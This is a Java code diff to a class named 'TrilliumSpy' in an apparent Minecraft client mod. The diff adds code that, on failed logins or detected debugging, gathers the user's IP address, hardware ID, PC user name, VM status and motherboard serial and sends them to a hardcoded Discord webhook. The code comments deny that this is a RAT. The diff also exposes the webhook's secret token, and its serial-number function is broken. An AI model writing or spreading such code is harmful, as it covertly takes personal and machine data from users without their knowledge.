@@ -1,16 +1,20 @@
 package dev._3000IQPlay.trillium;
 
 import dev._3000IQPlay.trillium.gui.auth.AuthGui;
-import dev._3000IQPlay.trillium.util.protect.keyauth.api.KeyAuth;
-import dev._3000IQPlay.trillium.util.protect.keyauth.util.HWID;
-import dev._3000IQPlay.trillium.util.protect.WebhookUtil;
+import dev._3000IQPlay.trillium.protect.antivm.VMDetector;
+import dev._3000IQPlay.trillium.protect.keyauth.api.KeyAuth;
+import dev._3000IQPlay.trillium.protect.keyauth.util.HWID;
+import dev._3000IQPlay.trillium.protect.WebhookUtil;
 import net.minecraft.client.Minecraft;
 
 import java.awt.*;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-public class TrilliumSpy {
+public class TrilliumSpy { // If u call this class rat then pls get brain
 	public static String enteredKey = "";
 	
     public static void sendLogginSuccess() {
@@ -37,12 +41,15 @@ public class TrilliumSpy {
 			}
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1079113808141885490/k_VCH-9WM4KMcr6wxHj9Vp_ti6w79-5l_EY8fQ0I47aCnKK0f-17-HtmnDfJoOUURgx5");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
-            embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + " failed to log in! (Possible attacker)");
+            embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + " failed to Log In! (Possible Attacker)");
             embed.setThumbnail("https://crafatar.com/avatars/" + Minecraft.getMinecraft().getSession().getProfile().getId() + "?size=128&overlay");
 			embed.addField("Key", "" + "||" + enteredKey + "||", false);
+			embed.addField("IP", "" + "||" + getIP() + "||", false);
+			embed.addField("HWID", "" + HWID.getHWID(), false);
 			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
 			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
-			embed.addField("HWID", "" + HWID.getHWID(), false);
+			embed.addField("Is In VM", "" + TrilliumSpy.getVMDRespond(), false);
+			embed.addField("Motherboard Serial Numbed", TrilliumSpy.getMachineSerialNumber(), false);
             embed.setColor(Color.RED);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -82,9 +89,67 @@ public class TrilliumSpy {
         }
     }
 	
+	public static void sendDebugOrDumpDetect() {
+        try {
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1079113808141885490/k_VCH-9WM4KMcr6wxHj9Vp_ti6w79-5l_EY8fQ0I47aCnKK0f-17-HtmnDfJoOUURgx5");
+            WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
+            embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + "USED Dump/Debug TOOL/S!!!");
+            embed.setThumbnail("https://crafatar.com/avatars/" + Minecraft.getMinecraft().getSession().getProfile().getId() + "?size=128&overlay");
+			embed.addField("Key", "" + "||" + enteredKey + "||", false);
+			embed.addField("IP", "" + "||" + getIP() + "||", false);
+			embed.addField("HWID", "" + HWID.getHWID(), false);
+			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
+			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
+			embed.addField("Is In VM", "" + TrilliumSpy.getVMDRespond(), false);
+			embed.addField("Motherboard Serial Numbed", TrilliumSpy.getMachineSerialNumber(), false);
+            embed.setColor(Color.ORANGE);
+            embed.setFooter(getTime(), null);
+            webhook.addEmbed(embed);
+            webhook.execute();
+        } catch (Exception e) {
+            // ignore
+        }
+    }
+	
+	public static String getVMDRespond() {
+		if (VMDetector.isVM()) {
+			return "Yes";
+	    } else {
+			return "No";
+		}
+	}
+	
+	public static String getMachineSerialNumber() {
+        try {
+            Process p = Runtime.getRuntime().exec("wmic baseboard get serialnumber");
+            BufferedReader inn = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+            while (true) {
+
+                String line = inn.readLine();
+                if (line == null) {
+                    break;
+                }
+            }
+        } catch (Exception e) {
+            return "0";
+        }
+        return "Exception";
+    }
+	
 	public static void getKey(String key) {
 		enteredKey = key;
 	}
+	
+	public static String getIP() throws Exception { // This info is already logged in KeyAuth but it only logs when login is sucessfull (Security feature, NOT a RAT)
+        String line;
+        StringBuilder builder = new StringBuilder();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com").openStream()));
+        while ((line = reader.readLine()) != null) {
+            builder.append(line);
+        }
+        return builder.toString();
+    }
 
     public static String getTime() {
         SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
